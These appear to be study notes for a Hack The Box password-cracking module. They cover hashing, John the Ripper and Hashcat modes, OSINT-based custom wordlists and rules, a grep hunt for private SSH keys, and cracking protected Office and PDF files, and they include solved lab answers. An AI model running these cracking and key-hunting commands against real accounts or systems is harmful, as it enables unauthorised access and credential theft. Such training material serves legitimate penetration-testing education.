# Introduction

Authentication (verifying identity) is distinct from authorization (granting permissions after successful authentication).

The four authentication factors:

1. Something you know (password, PIN, passphrase)
2. Something you have (smart card, trusted device)
3. Something you are (biometrics)
4. Somewhere you are (geolocation, IP)

Higher-security systems combine multiple factors (e.g., a CAC card + PIN + authenticator app for medical systems).

## Passwords as the dominant method

Despite being just one factor, passwords remain the most widespread authentication mechanism due to convenience and low implementation cost, even though added complexity tends to hurt UX. The math example given: an 8-character password using only uppercase letters and numbers yields 36⁸ (~208 billion) combinations — illustrating theoretical strength versus real-world weak practices.

## Key statistics


| Source                  | Finding                                                                                                                                          |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Google/Harris Poll 2019 | 24% of Americans used passwords like "123456," "qwerty," "password"                                                                              |
| Same survey             | Only 15% used password managers; 22% used their own name, 33% used a pet/child's name                                                            |
| Same survey             | 66% password reuse rate across accounts                                                                                                          |
| Same survey             | Only 45% change passwords after a breach (55% don't)                                                                                             |
| Panda Security 2025     | "123456" still most common (4.5M breach appearances); 23%+ reuse across 3+ accounts; password manager adoption up to 36% (more than double 2019) |




## Practical takeaway for pentesting

If you crack or guess one password, there's a meaningful statistical chance (~23-66% depending on the dataset) it's reused elsewhere — making credential reuse a key pivot strategy once you've obtained one valid set of credentials, provided you can also identify the username/email pattern across platforms. HaveIBeenPwned is mentioned as a tool to check if an email has appeared in known breaches.
The section ends by transitioning into how passwords/credentials are actually stored — setting up the next section (likely hashing, salting, etc.).

# Introduction to Password Cracking

Passwords are stored as hashes rather than plaintext to limit damage if a database is compromised. A hash function takes arbitrary input and produces a fixed-size output. And critically, it's one-way: you can't reverse a hash back to the original password directly.

#### SHA1

```bash
echo -n Academy#2025 | sha1sum
```



#### MD5

```bash
echo -n <password> | md5sum
```



#### SHA-256

```bash
echo -n <password> | sha256sum
```



## Password Cracking Techniques



### Rainbow Tables

- Pre-compiled lookup tables mapping passwords -> hashes for a given algorithm
- Extremely fast: just look up the hash and get the password
- Countered by salting: a random byte sequence prepended to the password before hashing
  - Salt is not secret - it's stored alongside the hash so the system can verify input
  - Even a 1-byte salt multiplies rainbow table size by 256 (15B -> 3.84T entries)
  - `Th1sIsTh3S@lt_Soccer06` produces a completely different MD5 than `Soccer06!` alone



### Brute-Force Attack

- Tries every possible combination of characters systematically
- The only 100% guaranteed technique (given enough time)
- Rarely practical for long/complex passwords - typically replaced by mask attacks (covered later)
- Speed varies massively by algorithm:


| Hash Algorithm | Speed (consumer hardware, Hashcat) |
| -------------- | ---------------------------------- |
| MD5            | ~5 million/sec                     |
| DCC2           | ~10 thousand/sec                   |


Viable for passwords < 9 characters.

### Dictionary Attack (Wordlist Attack)

- Uses a list of statiscally likely passwords instead of all combinations
- Far more efficient than brute-force - the go-to technique under time constraints (i.e., real pentests)
- Key wordlists:
  - rockyou.txt - 14M+ real passwords leaked from the 2009 RockYou breack (stored in plaintext by the company)
  - SecLists - curated collection for various attack scenarios

```bash
head --lines=20 /usr/share/wordlists/rockyou.txt
# 123456, 12345, password, iloveyou...
```



## Key Takeaways

- MD5 and SHA-256 are common hash functions, but differ drastically in crack resistance
- Salting is the primary defense against rainbow tables; unsalted hashes are trivially attacked with prebuilt tables
- Dictionary attacks are the pentester's default - fast, targeted, and effective against real-world weak passwords
- Brute-force is the nuclear option: always works, rarely practical beyond shorts passwords
- The progression in this module: dictionary -> mask -> brute-force as escalating fallbacks



## Connect to HTB



#### What is the SHA1 hash for `Academy#2025`?

```bash
echo -n Academy#2025 | sha1sum
750fe4b402dc9f91cedf09b652543cd85406be8c
```



# Introduction to John The Ripper



## What is John The Ripper?

Open-source password cracking tool, first released in 1996 for UNIX systems. Use the jumbo variant - it has performance optimizations, 64-bit support, multilingual wordlists, and is regularly updated.

Also ships with a suite of *2john conversion tools for preprocessing files into JtR-compatible hash formats.

## Cracking Modes



### Single Crack Mode

Rule-based attack targeting Linux credentials specifically. Generates candidates from:

- Username
- Home directory name
- GECOS values (full name, room number, phone, etc.)

Then applies common string mutation rules (e.g., user `Rolf Sebastian` -> tries `Sebastian1`, `RolfS`, etc.).

```bash
john --single passwd
```

Example `/etc/passwd`-style entry it would process:

```bash
r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash

```

Output confirms cracked password with session stats (g/s = guesses/sec).

### Wordlist Mode

Dictionary attack - tries every password in a supplied wordlist against the hash.

```bash
john --wordlist=<wordlist_file> <hash_file>
```

- Wordlist must be plaintext, one word per line
- Multiple wordlists: comma-separated
- Apply transformation rules with `--rules`:

```bash
john --wordlist=rockyou.txt --rules <hash_file>
```

Rules can: append numbers, capitalize letters, add special characters, etc.

### Incremental Mode

Brute-force-style but smarter - uses Markov chains (statistical model trained on real passwords) to prioritize more likely candidates before less likely ones. Does not use a wordlist.

```bash
john --incremental <hash_file>
```

Default character sets and lengths are defined in `/etc/john/john.conf`:

```bash
grep '# Incremental modes' -A 100 /etc/john/john.conf
```

Key built-in modes from the config:


| Mode     | Charset file | CharCount | Notes           |
| -------- | ------------ | --------- | --------------- |
| `Custom` | `custom.chr` | —         | User-defined    |
| `UTF8`   | `utf8.chr`   | 196       | Unicode         |
| `Latin1` | `latin1.chr` | 203       | CP1252 superset |
| `ASCII`  | `ascii.chr`  | 95        | MaxLen: 13      |


> Most exhaustive and most time-consuming. Customizing charset + length improves performance.



## Identifying Unknown Hash Formats

When you don't know what type of hash you're dealing with:

```bash
hashid -j 193069ceb0461e1d40d216e32c79c704
```

`-j` flag also outputs the corresponding JtR format string alongside each guess. Output may return many candidates - context of where the hash was found usually narrows it down.

Alternative references:

- JtR's own sample hash documentation
- PentestMonkey hash list

To explicitly tell JtR the format:

```bash
john --format=<format> <hash_file>
```


| **Hash format**      | **Example command**                               | **Description**                                                      |
| -------------------- | ------------------------------------------------- | -------------------------------------------------------------------- |
| afs                  | `john --format=afs [...] <hash_file>`             | AFS (Andrew File System) password hashes                             |
| bfegg                | `john --format=bfegg [...] <hash_file>`           | bfegg hashes used in Eggdrop IRC bots                                |
| bf                   | `john --format=bf [...] <hash_file>`              | Blowfish-based crypt(3) hashes                                       |
| bsdi                 | `john --format=bsdi [...] <hash_file>`            | BSDi crypt(3) hashes                                                 |
| crypt(3)             | `john --format=crypt [...] <hash_file>`           | Traditional Unix crypt(3) hashes                                     |
| des                  | `john --format=des [...] <hash_file>`             | Traditional DES-based crypt(3) hashes                                |
| dmd5                 | `john --format=dmd5 [...] <hash_file>`            | DMD5 (Dragonfly BSD MD5) password hashes                             |
| dominosec            | `john --format=dominosec [...] <hash_file>`       | IBM Lotus Domino 6/7 password hashes                                 |
| EPiServer SID hashes | `john --format=episerver [...] <hash_file>`       | EPiServer SID (Security Identifier) password hashes                  |
| hdaa                 | `john --format=hdaa [...] <hash_file>`            | hdaa password hashes used in Openwall GNU/Linux                      |
| hmac-md5             | `john --format=hmac-md5 [...] <hash_file>`        | hmac-md5 password hashes                                             |
| hmailserver          | `john --format=hmailserver [...] <hash_file>`     | hmailserver password hashes                                          |
| ipb2                 | `john --format=ipb2 [...] <hash_file>`            | Invision Power Board 2 password hashes                               |
| krb4                 | `john --format=krb4 [...] <hash_file>`            | Kerberos 4 password hashes                                           |
| krb5                 | `john --format=krb5 [...] <hash_file>`            | Kerberos 5 password hashes                                           |
| LM                   | `john --format=LM [...] <hash_file>`              | LM (Lan Manager) password hashes                                     |
| lotus5               | `john --format=lotus5 [...] <hash_file>`          | Lotus Notes/Domino 5 password hashes                                 |
| mscash               | `john --format=mscash [...] <hash_file>`          | MS Cache password hashes                                             |
| mscash2              | `john --format=mscash2 [...] <hash_file>`         | MS Cache v2 password hashes                                          |
| mschapv2             | `john --format=mschapv2 [...] <hash_file>`        | MS CHAP v2 password hashes                                           |
| mskrb5               | `john --format=mskrb5 [...] <hash_file>`          | MS Kerberos 5 password hashes                                        |
| mssql05              | `john --format=mssql05 [...] <hash_file>`         | MS SQL 2005 password hashes                                          |
| mssql                | `john --format=mssql [...] <hash_file>`           | MS SQL password hashes                                               |
| mysql-fast           | `john --format=mysql-fast [...] <hash_file>`      | MySQL fast password hashes                                           |
| mysql                | `john --format=mysql [...] <hash_file>`           | MySQL password hashes                                                |
| mysql-sha1           | `john --format=mysql-sha1 [...] <hash_file>`      | MySQL SHA1 password hashes                                           |
| NETLM                | `john --format=netlm [...] <hash_file>`           | NETLM (NT LAN Manager) password hashes                               |
| NETLMv2              | `john --format=netlmv2 [...] <hash_file>`         | NETLMv2 (NT LAN Manager version 2) password hashes                   |
| NETNTLM              | `john --format=netntlm [...] <hash_file>`         | NETNTLM (NT LAN Manager) password hashes                             |
| NETNTLMv2            | `john --format=netntlmv2 [...] <hash_file>`       | NETNTLMv2 (NT LAN Manager version 2) password hashes                 |
| NEThalfLM            | `john --format=nethalflm [...] <hash_file>`       | NEThalfLM (NT LAN Manager) password hashes                           |
| md5ns                | `john --format=md5ns [...] <hash_file>`           | md5ns (MD5 namespace) password hashes                                |
| nsldap               | `john --format=nsldap [...] <hash_file>`          | nsldap (OpenLDAP SHA) password hashes                                |
| ssha                 | `john --format=ssha [...] <hash_file>`            | ssha (Salted SHA) password hashes                                    |
| NT                   | `john --format=nt [...] <hash_file>`              | NT (Windows NT) password hashes                                      |
| openssha             | `john --format=openssha [...] <hash_file>`        | OPENSSH private key password hashes                                  |
| oracle11             | `john --format=oracle11 [...] <hash_file>`        | Oracle 11 password hashes                                            |
| oracle               | `john --format=oracle [...] <hash_file>`          | Oracle password hashes                                               |
| pdf                  | `john --format=pdf [...] <hash_file>`             | PDF (Portable Document Format) password hashes                       |
| phpass-md5           | `john --format=phpass-md5 [...] <hash_file>`      | PHPass-MD5 (Portable PHP password hashing framework) password hashes |
| phps                 | `john --format=phps [...] <hash_file>`            | PHPS password hashes                                                 |
| pix-md5              | `john --format=pix-md5 [...] <hash_file>`         | Cisco PIX MD5 password hashes                                        |
| po                   | `john --format=po [...] <hash_file>`              | Po (Sybase SQL Anywhere) password hashes                             |
| rar                  | `john --format=rar [...] <hash_file>`             | RAR (WinRAR) password hashes                                         |
| raw-md4              | `john --format=raw-md4 [...] <hash_file>`         | Raw MD4 password hashes                                              |
| raw-md5              | `john --format=raw-md5 [...] <hash_file>`         | Raw MD5 password hashes                                              |
| raw-md5-unicode      | `john --format=raw-md5-unicode [...] <hash_file>` | Raw MD5 Unicode password hashes                                      |
| raw-sha1             | `john --format=raw-sha1 [...] <hash_file>`        | Raw SHA1 password hashes                                             |
| raw-sha224           | `john --format=raw-sha224 [...] <hash_file>`      | Raw SHA224 password hashes                                           |
| raw-sha256           | `john --format=raw-sha256 [...] <hash_file>`      | Raw SHA256 password hashes                                           |
| raw-sha384           | `john --format=raw-sha384 [...] <hash_file>`      | Raw SHA384 password hashes                                           |
| raw-sha512           | `john --format=raw-sha512 [...] <hash_file>`      | Raw SHA512 password hashes                                           |
| salted-sha           | `john --format=salted-sha [...] <hash_file>`      | Salted SHA password hashes                                           |
| sapb                 | `john --format=sapb [...] <hash_file>`            | SAP CODVN B (BCODE) password hashes                                  |
| sapg                 | `john --format=sapg [...] <hash_file>`            | SAP CODVN G (PASSCODE) password hashes                               |
| sha1-gen             | `john --format=sha1-gen [...] <hash_file>`        | Generic SHA1 password hashes                                         |
| skey                 | `john --format=skey [...] <hash_file>`            | S/Key (One-time password) hashes                                     |
| ssh                  | `john --format=ssh [...] <hash_file>`             | SSH (Secure Shell) password hashes                                   |
| sybasease            | `john --format=sybasease [...] <hash_file>`       | Sybase ASE password hashes                                           |
| xsha                 | `john --format=xsha [...] <hash_file>`            | xsha (Extended SHA) password hashes                                  |
| zip                  | `john --format=zip [...] <hash_file>`             | ZIP (WinZip) password hashes                                         |




Key formats to remember for pentesting:


| Format flag                              | Use case                                |
| ---------------------------------------- | --------------------------------------- |
| `raw-md5`                                | Raw MD5                                 |
| `raw-sha1` / `raw-sha256` / `raw-sha512` | SHA variants                            |
| `nt`                                     | Windows NT hashes                       |
| `netntlmv2`                              | NTLMv2 (very common in AD environments) |
| `mscash2`                                | Domain Cached Credentials v2            |
| `mskrb5`                                 | MS Kerberos 5                           |
| `ssh`                                    | SSH private key                         |
| `zip` / `rar`                            | Encrypted archives                      |
| `pdf`                                    | Password-protected PDFs                 |




## Cracking Files with *2john Tools

Convert protected files to JtR-compatible hashes first:

```bash
<tool> <file_to_crack> > file.hash
```

Then crack the resulting hash file normally with JtR. Key tools:


| Tool           | Target               |
| -------------- | -------------------- |
| `pdf2john`     | PDF documents        |
| `ssh2john`     | SSH private keys     |
| `keepass2john` | KeePass databases    |
| `zip2john`     | ZIP archives         |
| `rar2john`     | RAR archives         |
| `office2john`  | MS Office documents  |
| `wpa2john`     | WPA/WPA2 handshakes  |
| `putty2john`   | PuTTY private keys   |
| `pfx2john`     | PKCS#12 certificates |


Find all available 2john tools on Pwnbox:

```bash
locate *2john*
```



## Key Takeaways

- Single crack -> best for Linux `/etc/passwd` targets with known usernames
- Wordlist -> default first move; combine with --rules for more coverage
- Incremental -> last resort before pure brute-force; smarter due to Markov model
- Always identify hash format first with `hashid -j` or by context - wrong format = zero results
- The `*2john` tools make JtR versatile beyond raw hashes: files, archives, keys, databases all become crackable.



## Connect to HTB



#### Use single-crack mode to crack r0lf's password

```bash
# hash2.txt
r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash

john --single hash2.txt

# password
john --show hash2.txt
r0lf:NAITSABES:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
```

```bash
# RIPEMD-128
193069ceb0461e1d40d216e32c79c704

john --wordlist=/usr/share/wordlists/rockyou.txt --format=ripemd-128 ~/hash3.txt

Using default input encoding: UTF-8
Loaded 1 password hash (ripemd-128, RIPEMD 128 [32/64])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
50cent           (?)     
1g 0:00:00:00 DONE (2026-07-01 11:53) 7.143g/s 2285p/s 2285c/s 2285C/s angelo..101010
```



# Introduction to Hashcat



## Overview

Hashcat is a cross-platform password cracking tool, open-source since 2015. Key advantage over JtR: excellent GPU support, making it significantly faster for most hash types.

General syntax:

```bash
hashcat -a <attack_mode> -m <hash_type> <hash_or_file> [wordlist/rule/mask]
```



## Identifying Hash Types

Two methods:

```bash
# List all supported hash modes
hashcat --help

# Use hashid with -m flag to get hashcat mode directly
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
```

Key hash mode IDs to remember:


| ID     | Hash Type         |
| ------ | ----------------- |
| `0`    | MD5               |
| `100`  | SHA1              |
| `1400` | SHA2-256          |
| `1700` | SHA2-512          |
| `900`  | MD4               |
| `6000` | RIPEMD-160        |
| `6100` | Whirlpool         |
| `500`  | MD5 Crypt (Linux) |




## Attack Modes



### Dictionary Attack (`-a 0`)

```bash
hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt
```



#### With rules (when wordlist alone fails)

```bash
hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Rule files location:

```bash
ls -l /usr/share/hashcat/rules
```

Key rule files:


| Rule file            | Description                                             |
| -------------------- | ------------------------------------------------------- |
| `best64.rule`        | 64 standard modifications (numbers, leet substitutions) |
| `rockyou-30000.rule` | Large ruleset based on rockyou patterns                 |
| `dive.rule`          | Most exhaustive ruleset                                 |
| `leetspeak.rule`     | Leet character substitutions                            |
| `toggles[1-5].rule`  | Case toggling variations                                |




### Mask Attack (`-a 3`)

Brute-force with a user-defined keyspace - much more efficient than pure brute-force because you define the password structure.

```bash
hashcat -a 3 -m 0 <hash> '?u?l?l?l?l?d?s'
```


| Symbol | Charset                         |
| ------ | ------------------------------- |
| `?l`   | `a-z` (lowercase)               |
| `?u`   | `A-Z` (uppercase)               |
| `?d`   | `0-9` (digits)                  |
| `?s`   | Special characters `!"#$%&'...` |
| `?a`   | `?l?u?d?s` (all printable)      |
| `?h`   | `0-9a-f` (hex lowercase)        |
| `?H`   | `0-9A-F` (hex uppercase)        |
| `?b`   | `0x00-0xff` (all bytes)         |


Custom charsets with `-1`, `-2`, `-3`, `-4`, then referenced as `?1`, `?2`, `?3`, `?4`: 

```bash
hashcat -a 3 -m 0 <hash> -1 '?l?d' '?1?1?1?1?1?1'
# tries all 6-char combinations of lowercase letters and digits
```



## Rading Hashcat Output

Key fields to check after a run:


| Field        | Meaning                              |
| ------------ | ------------------------------------ |
| `Status`     | `Cracked` / `Exhausted` / `Running`  |
| `Recovered`  | How many hashes cracked out of total |
| `Speed`      | Hashes per second (higher = faster)  |
| `Candidates` | Last few passwords tested            |
| `Progress`   | % of keyspace covered                |




## Key Takeaways

- Always identify hash type first with `hashid -m` or `hashcat --help`
- Dictionary -> default first move with rockyou.txt
- Dictionary + rules -> when plain wordlist fails; `best64.rule` is a good starting point
- Mask -> when you know the password structure (length, character types)
- Hashcat is generally faster than JtR due to GPU acceleration - prefer it for large hash sets



#### Use a dictionary attack to crack the first password hash. (Hash: e3e3ec5831ad5e7288241960e5d4fdb8)

```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

e3e3ec5831ad5e7288241960e5d4fdb8:crazy!                   
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: e3e3ec5831ad5e7288241960e5d4fdb8
Time.Started.....: Wed Jul  1 12:06:31 2026 (0 secs)
Time.Estimated...: Wed Jul  1 12:06:31 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2673.1 kH/s (0.67ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 32768/14344384 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 24576/14344384 (0.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 271087 -> dyesebel
Hardware.Mon.#1..: Temp: 39c Util: 18%

Started: Wed Jul  1 12:05:56 2026
Stopped: Wed Jul  1 12:06:32 2026

```



#### Use a dictionary attack with rules to crack the second password hash. (Hash: 1b0556a75770563578569ae21392630c)

```bash
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 1104517568

1b0556a75770563578569ae21392630c:c0wb0ys1                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1b0556a75770563578569ae21392630c
Time.Started.....: Wed Jul  1 12:08:27 2026 (0 secs)
Time.Estimated...: Wed Jul  1 12:08:27 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 12470.5 kH/s (11.30ms) @ Accel:256 Loops:77 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 315392/1104517568 (0.03%)
Rejected.........: 0/315392 (0.00%)
Restore.Point....: 2048/14344384 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: slimshady -> oooooo
Hardware.Mon.#1..: Temp: 40c Util: 19%

Started: Wed Jul  1 12:08:25 2026
Stopped: Wed Jul  1 12:08:29 2026

```



#### Use a mask attack to crack the third password hash. (Hash: 1e293d6912d074c0fd15844d803400dd)

```bash
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

1e293d6912d074c0fd15844d803400dd:Mouse5!                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1e293d6912d074c0fd15844d803400dd
Time.Started.....: Wed Jul  1 12:14:04 2026 (2 secs)
Time.Estimated...: Wed Jul  1 12:14:06 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?u?l?l?l?l?d?s [7]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   223.2 MH/s (8.50ms) @ Accel:1024 Loops:256 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 482279424/3920854080 (12.30%)
Rejected.........: 0/482279424 (0.00%)
Restore.Point....: 24576/223080 (11.02%)
Restore.Sub.#1...: Salt:0 Amplifier:5888-6144 Iteration:0-256
Candidate.Engine.: Device Generator
Candidates.#1....: Ggnrg9! -> Diksc7_
Hardware.Mon.#1..: Temp: 42c Util: 96%

Started: Wed Jul  1 12:14:00 2026
Stopped: Wed Jul  1 12:14:08 2026

```



# Writing Custom Wordlists and Rules



## Why Custom Wordlists?

Generic wordlists like rockyou.txt fail against complex passwords. Users predictably follow patterns even under strict password policies:


| Pattern                 | Example         |
| ----------------------- | --------------- |
| Capitalize first letter | `Password`      |
| Append numbers          | `Password123`   |
| Append year             | `Password2022`  |
| Append month            | `Password02`    |
| Add `!` at end          | `Password2022!` |
| Leet substitutions      | `P@ssw0rd2022!` |


OSINT is key - personal info (pet names, hobbies, company name, city) dramatically narrows the candidate space.

## Hashcat Rule Syntax

Rules are written one per line in a `rule` file. Core functions:


| Function | Description                             |
| -------- | --------------------------------------- |
| `:`      | Do nothing (keep word as-is)            |
| `l`      | Lowercase all letters                   |
| `u`      | Uppercase all letters                   |
| `c`      | Capitalize first letter, lowercase rest |
| `sXY`    | Replace all instances of X with Y       |
| `$!`     | Append `!` at the end                   |


Rules can be chained on the same line:

```bash
c so0        # Capitalize + replace o→0
$! c sa@     # Append ! + capitalize + replace a→@
```



## Generating a Mutated Wordlist

Create your base wordlist and rule file, then generate all mutations:

```bash
# Create base wordlist
cat password.list
# password

# Create custom rule file
cat custom.rule
# :
# c
# so0
# c so0
# sa@
# c sa@
# c sa@ so0
# $!
# $! c
# $! so0
# $! sa@
# $! c so0
# $! c sa@
# $! so0 sa@
# $! c so0 sa@

# Generate mutated wordlist
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

# Check output
cat mut_password.list
# password, Password, passw0rd, Passw0rd, p@ssword,
# P@ssword, P@ssw0rd, password!, Password!, passw0rd!,
# p@ssword!, Passw0rd!, P@ssword!, p@ssw0rd!, P@ssw0rd!
```

One input word -> 15 mutated variants with this ruleset

## Generating Wordlists with CeWL

Scrapes words directly from a target company's website - highly effective for targeted attacks: 

```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
wc -l inlane.wordlist
# 326 words
```


| Flag          | Description                               |
| ------------- | ----------------------------------------- |
| `-d 4`        | Spider depth (follow links 4 levels deep) |
| `-m 6`        | Minimum word length of 6 chars            |
| `--lowercase` | Store all words in lowercase              |
| `-w`          | Output file                               |




## Workflow for Targeted Password Cracking

```bash
OSINT gathering
      ↓
Build base wordlist (personal info + company name + location)
      ↓
Apply mutation rules (hashcat --stdout)
      ↓
CeWL scrape of company website (optional, combine with base list)
      ↓
hashcat -a 0 -m <mode> <hash> mut_password.list -r best64.rule
```



## Key Takeaways

- OSINT first - The more you know about the target, the smaller and more precise your wordlist
- Rules multiply coverage - one good base word x a solid ruleset = thousands of realistic candidates
- CeWL is a force multiplier for corporate targets - company-specific jargon ends up in passwords
- best64.rule is the go-to pre-built ruleset for most situations
- Policy awareness narrows the mask: if you know min length + required character types, you can filter or build accordingly



## Connect to HTB



### Exercise

For this sections exercise, imagine that we compromised the password hash of a work email belonging to Mark White. After performing a bit of OSINT, we have gathered the following information about Mark:

He was born on August 5, 1998
He works at Nexura, Ltd.
The company's password policy requires passwords to be at least 12 characters long, to contain at least one uppercase letter, at least one lowercase letter, at least one symbol and at least one number
He lives in San Francisco, CA, USA
He has a pet cat named Bella
He has a wife named Maria
He has a son named Alex
He is a big fan of baseball
The password hash is: `97268a8ae45ac7d15c3cea4ce6ea550b`. Use the techniques covered in this section to generate a custom wordlist and ruleset targeting Mark specifically, and crack the password.

#### What is Mark's password?

1. Build the base wordlist: Create a file with all personal keywords from the OSINT:

```bash
cat > mark.wordlist << EOF
mark
white
markwhite
nexura
bella
maria
alex
baseball
sanfrancisco
francisco
august
1998
0598
05081998
EOF
```

1. Create a rule file targeting the policy: Policy requires 12+ chars, upper+ lower + symbol + number. So mutations need to reflect that:

```bash
# Create a rule file targeting the policy
cat > mark.rule << 'EOF'
c $1 $9 $9 $8 $!
c $1 $9 $9 $8 $@
c so0 $1 $9 $9 $8 $!
c sa@ $1 $9 $9 $8 $!
c sa@ so0 $1 $9 $9 $8 $!
c $0 $5 $0 $8 $1 $9 $9 $8 $!
c $2 $0 $2 $2 $!
c $2 $0 $2 $3 $!
c $2 $0 $2 $4 $!
EOF
```

1. Generate mutated wordlist

```bash
hashcat --force mark.wordlist -r mark.rule --stdout | sort -u > mut_mark.list

# Check what was generated
cat mut_mark.list
wc -l mut_mark.list
```

1. Crack the hash

```bash
hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_mark.list

97268a8ae45ac7d15c3cea4ce6ea550b:Baseball1998!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 97268a8ae45ac7d15c3cea4ce6ea550b
Time.Started.....: Wed Jul  1 12:32:38 2026 (0 secs)
Time.Estimated...: Wed Jul  1 12:32:38 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (mut_mark.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   166.7 kH/s (0.11ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 96/96 (100.00%)
Rejected.........: 0/96 (0.00%)
Restore.Point....: 0/96 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 0508199805081998! -> White2024!
Hardware.Mon.#1..: Temp: 39c Util: 25%

Started: Wed Jul  1 12:32:37 2026
Stopped: Wed Jul  1 12:32:40 2026

```

It that does not work, escalate with best64:

```bash
hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_mark.list -r /usr/share/hashcat/rules/best64.rule
```

Baseball1998!

# Cracking Protected Files



## Overview

Encrypted files are common in corporate environments (GDPR mandates it), but encryption only protects you if the password is strong. This section covers finding and cracking password-protected files and SSH keys during post-exploitation.

## Hunting for Encrypted Files

Search for common encrypted file extensions on a Linux system:

```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
    echo -e "\nFile extension: " $ext
    find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```



## Hunting for SSH Keys

SSH keys have no standard extension - identify bby header content instead:

```bash
# Find all private keys recursively
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

Check if an SSH key is passphrase-protected:

```bash
# Unprotected → prints public key directly
ssh-keygen -yf ~/.ssh/id_ed25519

# Protected → prompts for passphrase
ssh-keygen -yf ~/.ssh/id_rsa
```

> With olderPEM format keys, `Proc-Type: 4,ENCRYPTED` in the header also reveals encryption. Modern keys look the same either way - always test with `ssh-keygen -yf`.



### Cracking Encrypted SSH Keys

```bash
# Step 1: Extract hash from key
ssh2john.py SSH.private > ssh.hash

# Step 2: Crack it
john --wordlist=rockyou.txt ssh.hash

# Step 3: View result
john ssh.hash --show
# SSH.private:1234
```



## Cracking Password-Protected Documents



### MS Office (`docx`, `.xlsx`, `.pptx`, etc.)

```bash
# Extract hash
office2john.py Protected.docx > protected-docx.hash

# Crack
john --wordlist=rockyou.txt protected-docx.hash

# Show result
john protected-docx.hash --show
# Protected.docx:1234
```



### PDF

```bash
# Extract hash
pdf2john.py PDF.pdf > pdf.hash

# Crack
john --wordlist=rockyou.txt pdf.hash

# Show result
john pdf.hash --show
# PDF.pdf:1234
```



## General Workflow

```bash
Find file (extension search or grep for SSH headers)
        ↓
Extract hash with *2john tool
        ↓
Crack with john --wordlist or hashcat
        ↓
john <hash_file> --show
```



## Key Takeaways

- Post-exploitation target priority: encrypted docs and SSH keys often contain credentials or access to further systems
- `ssh-keygen -yf` is the quickest way to check if a key needs a passphrase
- The `*2john` tools handle the format conversion - the cracking process itself is identical regardless of file type
- Standard wordlists may fail on modern complex passwords — custom wordlists + rules (Section 5) become essential here
- Cracking is always worth attempting even if uncertain - documents may contain pivoting credentials



## Connect to HTB

```bash
# Extract the file
python3 office2john.py ../../Desktop/a/Confidential.xlsx > confidential.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ~/john/run/confidential.hash

Using default input encoding: UTF-8
